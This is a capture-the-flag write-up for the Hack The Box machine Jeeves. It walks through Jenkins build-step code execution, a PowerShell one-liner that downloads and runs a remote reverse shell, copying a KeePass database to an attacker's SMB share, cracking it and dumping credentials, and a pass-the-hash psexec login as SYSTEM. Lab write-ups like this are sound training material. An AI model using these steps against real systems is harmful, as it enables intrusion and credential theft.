---
title: Jeeves
summary: "workflow of HTB machine Jeeves"
date: 2025-11-15
tag: htb-machines
---

![](/images/posts/Jeeves.png)
[https://app.hackthebox.com/machines/114](https://app.hackthebox.com/machines/114)

---

# Enumeration 
## `nmap` scan 

```bash
$nmap -sV -sC 10.10.10.63 -p-                                                                                                                                         
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-10-20 15:55 +01                                                                                                                            
Nmap scan report for 10.10.10.63                                                                                                                                                              
Host is up (0.21s latency).                                                                                                                                                                   
Not shown: 65531 filtered tcp ports (no-response)                                                                                                                                             
PORT      STATE SERVICE      VERSION                                                                                                                                                          
80/tcp    open  http         Microsoft IIS httpd 10.0                                                                                                                                         
| http-methods:                                                                                                                                                                               
|_  Potentially risky methods: TRACE                                                                                                                                                          
|_http-server-header: Microsoft-IIS/10.0                                                                                                                                                      
|_http-title: Ask Jeeves                                                                                                                                                                      
135/tcp   open  msrpc        Microsoft Windows RPC                                                                                                                                            
445/tcp   open  microsoft-ds Microsoft Windows 7 - 10 microsoft-ds (workgroup: WORKGROUP)                                                                                                     
50000/tcp open  http         Jetty 9.4.z-SNAPSHOT                                                                                                                                             
|_http-title: Error 404 Not Found                                                                                                                                                             
|_http-server-header: Jetty(9.4.z-SNAPSHOT)                                                                                                                                                   
Service Info: Host: JEEVES; OS: Windows; CPE: cpe:/o:microsoft:windows                                                                                                                        
                                                                                                          
Host script results:                           
|_clock-skew: mean: 4h59m46s, deviation: 0s, median: 4h59m46s                                                                                                                                 
| smb-security-mode:                                                                                      
|   account_used: guest                        
|   authentication_level: user                                                                 
|   challenge_response: supported                                                              
|_  message_signing: disabled (dangerous, but default)                                                                                                                                        
| smb2-time:                                                                                              
|   date: 2025-10-20T20:28:21                                                                  
|_  start_date: 2025-10-18T22:14:52                                                            
| smb2-security-mode:                                
|   3:1:1:            
|_    Message signing enabled but not required 
```

- from the output ,  we see 4 open ports 
- there is two web server (Microsoft IIS and Jetty)

## SMB 
- we can't connect to SMB using null session or using anonymous creds

## Jetty web server 

- browsing to http://$IP:50000 show 404 page web and lien to Jetty 9.4.z snapshot 

![](/images/posts/Jeeves_000275.png)

- i use `gobuster` to Brute force the webserver , to find hidden directories

```bash
$gobuster dir -u http://10.10.10.63:50000/ -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt                                        21:44:58 [627/681]
===============================================================                             
Gobuster v3.6                                                                              
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)                               
===============================================================                             
[+] Url:                     http://10.10.10.63:50000/                                      
[+] Method:                  GET                                                           
[+] Threads:                 10                                                            
[+] Wordlist:                /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
[+] Negative Status codes:   404                                                           
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s                                                           
===============================================================                             
Starting gobuster in directory enumeration mode                                             
===============================================================       

/askjeeves            (Status: 302) [Size: 0] [--> http://10.10.10.63:50000/askjeeves/]  
```

> Fuzzing the server reveals an `askjeeves` directory which contains a Jenkins server.

- when we create a new freestyle project, we can found a drop-down that offers commands in Build section 

![](/images/posts/Jeeves_000276.png)

- we add a command for example `whoami` , and then go backup to Project page and Build it .

![](/images/posts/Jeeves_000277.png)

![](/images/posts/Jeeves_000278.png)

## Exploit 

- Now , we can upload a reverse shell script and run it to get reverse shell using the following script 

```powershell
powershell -C IEX (New-Object System.Net.WebClient).DownloadString(\"http://<IP>$:2222/shell.ps1\")
```

- after we run a listener in our machine and build the project , we got the shell 

![](/images/posts/Jeeves_000279.png)

----

# Post-exploitation 
## privileges escalation 

### enumeration 

- in Documents dir of `kohsuke`, i found KeePass password database that 

```powershell
PS C:\Users\kohsuke\Downloads> ls C:\Users\kohsuke\Documents


    Directory: C:\Users\kohsuke\Documents


Mode                LastWriteTime         Length Name                                                                   
----                -------------         ------ ----                                                                   
-a----        9/18/2017   1:43 PM           2846 CEH.kdbx  
```

>[!info] 
>- KeePass is ==a free, open-source password manager that securely stores user credentials in an encrypted database==
>- A `.kdbx` file is a password-protected database used by password managers like [KeePass](https://keepass.info/) to securely store sensitive information, such as logins, notes, and other secrets. It is an encrypted file that uses strong encryption algorithms like AES-256 or ChaCha20 to protect its contents, and it can only be unlocked with a master password or key file.

- i move this file to my machine to crack it 
- i start SMB server using `impacket-smbserver` 

```bash
sudo impacket-smbserver hacker .
```

- and send the file `CEH.kdbx` using the following command

```powershell
PS C:\Users\kohsuke\Downloads> New-PSDrive -Name "hacker" -PSProvider "FileSystem" -Root "\\10.10.14.76\hacker"

Name           Used (GB)     Free (GB) Provider      Root                                               CurrentLocation
----           ---------     --------- --------      ----                                               ---------------
hacker                                 FileSystem    \\10.10.14.76\hacker                                              


PS C:\Users\kohsuke\Downloads> cd hacker:

PS hacker:\> cp C:\Users\kohsuke\Documents\CEH.kdbx .

```

- to crack the file , we will use the `keepass2john` to generate hash 

```bash
keepass2john CEH.kdbx > CEH.hash
```

- then we will crack the hash using `john`

```bash
$john CEH.hash --wordlist=/usr/share/wordlists/rockyou.txt

Using default input encoding: UTF-8
Loaded 1 password hash (KeePass [SHA256 AES 32/64])
Cost 1 (iteration count) is 6000 for all loaded hashes
Cost 2 (version) is 2 for all loaded hashes
Cost 3 (algorithm [0=AES 1=TwoFish 2=ChaCha]) is 0 for all loaded hashes
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
moonshine1       (CEH)     
1g 0:00:01:25 DONE (2025-10-21 22:30) 0.01173g/s 645.1p/s 645.1c/s 645.1C/s mwuah..moonshine1
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
```

> so the password is `moonshine1`

- using this password we can open this file using he following command 

```bash
$kpcli -kdb CEH.kdbx 
Provide the master password: *************************

KeePass CLI (kpcli) v3.8.1 is ready for operation.
Type 'help' for a description of available commands.
Type 'help <command>' for details on individual commands.

kpcli:/> 

```

-  list all passwords . 

```bash
kpcli:/> ls
=== Groups ===
CEH/
kpcli:/> cd CEH
kpcli:/CEH> ls
=== Groups ===
eMail/
General/
Homebanking/
Internet/
Network/
Windows/
=== Entries ===
0. Backup stuff                                                           
1. Bank of America                                   www.bankofamerica.com
2. DC Recovery PW                                                         
3. EC-Council                               www.eccouncil.org/programs/cer
4. It's a secret                                 localhost:8180/secret.jsp
5. Jenkins admin                                            localhost:8080
6. Keys to the kingdom                                                    
7. Walmart.com                                             www.walmart.com
kpcli:/CEH> show -f 0

Title: Backup stuff
Uname: ?
 Pass: aad3b435b51404eeaad3b435b51404ee:e0fb1fb85756c24235ff238cbe81fe00
  URL: 
Notes: 

kpcli:/CEH> show -f 1

Title: Bank of America
Uname: Michael321
 Pass: 12345
  URL: https://www.bankofamerica.com
Notes: 

kpcli:/CEH> show -f 2

Title: DC Recovery PW
Uname: administrator
 Pass: S1TjAtJHKsugh9oC4VZl
  URL: 
Notes: 

kpcli:/CEH> show -f 3

Title: EC-Council
Uname: hackerman123
 Pass: pwndyouall!
  URL: https://www.eccouncil.org/programs/certified-ethical-hacker-ceh
Notes: Personal login

kpcli:/CEH> show -f 4

Title: It's a secret
Uname: admin
 Pass: F7WhTrSFDKB6sxHU1cUn
  URL: http://localhost:8180/secret.jsp
Notes: 

kpcli:/CEH> show -f 5

Title: Jenkins admin
Uname: admin
 Pass: 
  URL: http://localhost:8080
Notes: We don't even need creds! Unhackable! 

kpcli:/CEH> show -f 6

Title: Keys to the kingdom
Uname: bob
 Pass: lCEUnYPjNfIuPZSzOySA
  URL: 
Notes: 

kpcli:/CEH> show -f 7

Title: Walmart.com
Uname: anonymous
 Pass: Password
  URL: http://www.walmart.com
Notes: Getting my shopping on

kpcli:/CEH> show -f 8
kpcli:/CEH> 

```

- I’ll collect the ones that look like passwords into a list

```bash
$cat passwords 
12345
S1TjAtJHKsugh9oC4VZl
pwndyouall!
F7WhTrSFDKB6sxHU1cUn
lCEUnYPjNfIuPZSzOySA
Password
```

- but no one work for the Administrator user 

![](/images/posts/Jeeves_000281.png)

## try hash 

- The first entry in the KeePass, “Backup”, provided what looks like a Windows hash:

```bash
kpcli:/CEH> ls Backup\ stuff 
=== Entries ===
0. Backup stuff                                                           
kpcli:/CEH> show -f 0

Title: Backup stuff
Uname: ?
 Pass: aad3b435b51404eeaad3b435b51404ee:e0fb1fb85756c24235ff238cbe81fe00
  URL: 
Notes: 
```

>[!info]
>- Windows will show hashes in the format `LM Hash:NT Hash`. 
>- LM is the much less secure hash format used in legacy Windows systems. It’s typically not used, but kept around for backwards compatibility. 
>- Many times, the LM hash for the blank password is stored, which is ignored by Windows but allows the field not to be empty. 
>- `aad3b435b51404eeaad3b435b51404ee` is the LM hash of the empty password.

![](/images/posts/Jeeves_000282.png)

## Exploit - pass the hash 

- using `nxc` tool , we know that hash is work for administrator user. 

![](/images/posts/Jeeves_000283.png)

> the account has also admin access because of `(Pwn3d!)`

- to get shell , i'll use `psexec.py`

```bash
$psexec.py -hashes aad3b435b51404eeaad3b435b51404ee:e0fb1fb85756c24235ff238cbe81fe00 administrator@10.10.10.63

[*] Requesting shares on 10.10.10.63.....
[*] Found writable share ADMIN$
[*] Uploading file eHmKYdxo.exe
[*] Opening SVCManager on 10.10.10.63.....
[*] Creating service PuAn on 10.10.10.63.....
[*] Starting service PuAn.....
[!] Press help for extra shell commands
Microsoft Windows [Version 10.0.10586]
(c) 2015 Microsoft Corporation. All rights reserved.

C:\Windows\system32> whoami
nt authority\system

C:\Windows\system32> 

```

- the flag exist in alternative data streams file 

```cmd
C:\Users\Administrator\Desktop> dir /R
 Volume in drive C has no label.
 Volume Serial Number is 71A1-6FA1

 Directory of C:\Users\Administrator\Desktop

11/08/2017  10:05 AM    <DIR>          .
11/08/2017  10:05 AM    <DIR>          ..
12/24/2017  03:51 AM                36 hm.txt
                                    34 hm.txt:root.txt:$DATA
11/08/2017  10:05 AM               797 Windows 10 Update Assistant.lnk
               2 File(s)            833 bytes
               2 Dir(s)   2,667,212,800 bytes free

```

- to read the file , we can use one of the following commands 

```cmd
more < hm.txt:root.txt:$DATA

powershell -C Get-Content -Path 'C:\Users\Administrator\Desktop\hm.txt:root.txt:$DATA' -Stream secret
```




---

![](/images/posts/Jeeves_Pwned.png)
